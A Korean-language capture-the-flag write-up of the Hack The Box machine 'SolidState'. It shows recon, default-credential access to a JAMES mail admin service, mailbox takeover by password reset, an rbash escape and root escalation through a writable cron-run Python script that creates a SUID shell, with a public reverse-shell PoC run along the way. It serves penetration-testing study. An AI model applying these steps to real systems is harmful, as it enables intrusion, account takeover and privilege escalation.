# HTB-SOLIDSTATE
```bash
OS: Linux
DATE: 26.10.12
DIFFICULTY: Medium
```

## RECON
**nmap**: 초기 포트 검사를 위해 전체 포트 검사와 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP
```
```bash
nmap -sC -sV -p 22,25,80,110,119,4555 IP
```
```bash
sudo nmap -sUV --top-ports 100 IP
```
포트 검사 결과 25(smtp), 80(http), 110(pop3), 그리고 4555라는 알 수 없는 포트들도 나왔다. 상세 검사를 진행한 결과 22, 80 포트 빼고 나머지는 상세 정보를 알 수 없어 어떤 시스템이 돌아가는지 알 수 없었다. 일단 먼저 주어진 서비스를 이용해 열거를 진행하였다. 처음으로 http에 접속하여 어떤 걸 실행 중인지 살펴보았다. `Solid State Security`라는 보안 관련 페이지였다. 따라서 지금 당장 알 수 있는 것이 없어 웹 디렉토리와 서브도메인 FUZZING을 진행하였다
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r
```
```bash
ffuf -u ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -c -r
```
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://solid-state-security.com -H "Host: FUZZ.solid-state-security.com"
```
fuzzing 결과 중요한 정보는 나오지 않았다. 따라서 확장자 fuzzing을 진행하였다
```bash
ffuf -u http://IP/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -c -r -e .php,.txt,.js
```
하지만 마찬가지로 중요한 정보들은 찾지 못하였다
## Initial Access
초기 정찰 이후 검사하지 않은 smtp, 4555 포트 등등을 접속해보았다
```bash
telnet IP 25

220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Tue, 13 Oct 2026 22:38:52 -0400 (EDT)
```
연결은 되었다. 하지만 무엇을 할 수 없는 상태여서 기본 크레덴셜을 넣고 여러 가지를 확인해보았지만 아무런 정보를 얻지 못하였다. 따라서 알 수 없어 4555번 포트를 nc를 통하여 접속해보았다
```bash
nc IP 4555

JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
```
접속 결과 id를 입력할 수 있는 창이 떴다. 그리고 `JAMES Remote Administration Tool 2.3.2`라는 서비스 정보를 얻게 되어 구글에 검색해본 결과 RCE 취약점이 있고, 그것을 이용할 수 있는 [PoC](https://www.exploit-db.com/exploits/50347) 또한 찾을 수 있었다. 먼저 기본 크레덴셜을 확인해본 결과 id:root passwd:root인 것을 알게 되었고 nc를 통해 다시 한 번 접속을 시도하였다
```bash 
nc IP 4555

JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id: root
password
Welcome root. HELP for a list of commands
```
접속을 성공하였다. 따라서 아까 원격 조정할 수 있는 PoC를 사용해보았다
```bash
python3 exploit.py Target_IP IP 4444

[+]Done! Payload will be executed once somebody logs in (i.e. via SSH).
[+]Don't forget to start a listener on port 4444 before logging in!
```
페이로드는 잘 업로드됐지만, 알고 보니 이 PoC는 어떤 사용자가 로그인을 해야 나의 쉘로 들어오는 리버스 쉘이기에 지금 당장 사용할 수 없다는 것을 알게 되었다. 따라서 다시 한 번 4555 포트에 접속하여 사용할 수 있는 명령어를 확인하였다
```bash
nc IP 4555

Welcome root. HELP for a list of commands
HELP
Currently implemented commands:
help                                    display this help
listusers                               display existing accounts
countusers                              display the number of existing accounts
adduser [username] [password]           add a new user
verify [username]                       verify if specified user exist
deluser [username]                      delete existing user
setpassword [username] [password]       sets a user's password
setalias [user] [alias]                 locally forwards all email for 'user' to 'alias'
showalias [username]                    shows a user's current email alias
unsetalias [user]                       unsets an alias for 'user'
setforwarding [username] [emailaddress] forwards a user's email to another email address
showforwarding [username]               shows a user's current email forwarding
unsetforwarding [username]              removes a forward
user [repositoryname]                   change to another user repository
shutdown                                kills the current JVM (convenient when James is run as a daemon)
quit                                    close connection
```
help를 하여 사용할 수 있는 명령어를 보았다. 일단 listusers로 유저들을 확인하고, 그 유저들을 setpassword 명령어로 password를 바꿀 수 있다는 것을 알게 되었다. 따라서 그대로 실행해주었다
```bash
nc IP 4555

listuser
Unknown command listuser
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```
유저명을 확인해주고 먼저 james라는 유저의 비밀번호를 바꿔주었다. setpassword 명령어로 유저 비번을 바꿔주었다
```bash
nc IP 4555

setpassword james pass
```
이후 메일 계정 크레덴셜을 알기에 pop3 포트로 가서 james 유저의 메일들을 보기 시작했다
```bash
telnet IP 110

+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER james
+OK
PASS pass
+OK Welcome james
LIST
+OK 0 0
```
리스트를 보았지만 아무것도 없어 나왔던 유저들을 그대로 똑같이 확인해주었다. 확인 결과 mindy라는 유저에게 메일들이 몇 개 있었다
```bash
telnet IP 110

+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready
USER mindy
+OK
PASS pass
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```
확인 결과 두 번째 메일에서 mindy의 평문 비밀번호를 알게 되었다. 따라서 ssh로 접속을 시도하였다
```bash
ssh mindy@IP
```
접속 결과 플래그는 읽을 수 있었지만 쉘이 restricted bash였다. 즉 제한된 배시 쉘이어서 할 수 있는 것이 `cat, ls, env`밖에 없었다. 따라서 제한된 쉘 안에서 우회할 수 있는데, python이나 vi도 모두 가능하지 않았기에 어떻게 할지 많이 헤맸다. mindy 계정을 /etc/passwd에서 확인해보면 `mindy:x:1001:1001:mindy:/home/mindy:/bin/rbash`라고 표시가 된다. 그냥 평범하게 ssh로 붙으면 이 사용자 로그인 쉘이 뭔지 확인하고 rbash를 띄워준다. 하지만 ssh -t 옵션을 사용하면 접속하면서 실행할 명령을 지정할 수 있다. 따라서 bash의 옵션인 --noprofile을 사용해주었다. 왜냐하면 bash는 시작할 때 .bash_profile, .bashrc 같은 설정 파일을 읽는다. 따라서 --noprofile --norc를 사용하여 우회를 시도하였다
```bash
ssh mindy@IP -t "/bin/bash --noprofile --norc"
```
시도한 결과 일반 mindy 쉘을 얻을 수 있게 되었다

![user](attach_real/Pasted%20image%2020261014120945.png)

## Privilege Escalation

이후 진짜 유저 쉘을 얻은 후에 권한 상승 경로를 많이 찾아보았다. 하지만 계속해서 실패하여 pspy64로 모니터링을 진행하려 하였지만 버전이 맞지 않다고 해서 pspy32로 진행하였다
```bash
chmod +x pspy32
./pspy32
```
모니터링 결과 루트 권한으로 규칙적으로 `python /opt/tmp.py`를 실행한다는 것을 알 수 있었다
```bash
2026/10/13 23:06:01 CMD: UID=0     PID=30593  | python /opt/tmp.py
```
따라서 이 파일 권한을 확인한 결과 write 권한도 있어, 이것을 수정하여 cron을 이용할 수 있을 것 같다는 생각이 들었다. 따라서 tmp.py 파일을 수정해주었다
```bash
#!/bin/bash
chmod +s /bin/bash
```
하지만 이것은 python 코드라는 것을 자각하고 있었다. 따라서 다시 한 번 더 시도하였다
```python
#!/usr/bin/env python
import os
import sys
try:
    os.system('cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash')
except:
    sys.exit()
```
따라서 조금 시간이 지난 후 `ls -l`로 권한을 확인한 결과 SUID로 변환이 된 것을 알 수 있었다. 이후 root 쉘로 들어가주었다
```bash
/bin/bash -p
```

![root](attach_real/Pasted%20image%2020261014103954.png)

## New Inform
- 항상 새로운, 낯선 포트일수록 중요한 무언가 있다
- 새로운 포트를 nc로 꼭 접속해서 확인하자
- nc나 telnet으로 접속하면 배너에 서비스 이름이 뜬다. 그것을 꼭 확인하자
- 만약 nc나 telnet으로 접속한 것이 평문 텍스트 기반 프로토콜이라면 HELP를 쳐서 뭘 할 수 있는지 알아보고 인터넷에 검색
- rbash: restricted bash, 즉 제한된 쉘
- rbash가 나오면 안에서 우회하는 것만 하지 말고 밖에서 ssh부터 시도해보자
- bash는 시작할 때 .bash_profile, .bashrc 같은 설정 파일을 읽는다. rbash 환경에선 이 파일들 안에 PATH를 쪼그라뜨리고 다시 rbash처럼 가둬버리는 설정이 심어져 있는 경우가 많음
- 만약 커널 관련 exploit을 할 거면 make나 gcc가 있는지 꼭 확인하자
- 무조건 bash script 페이로드만 쓰지 말자
- 무언가를 시도하기 전에 항상 먼저 pspy 도구와 linpeas를 돌리고 시작하자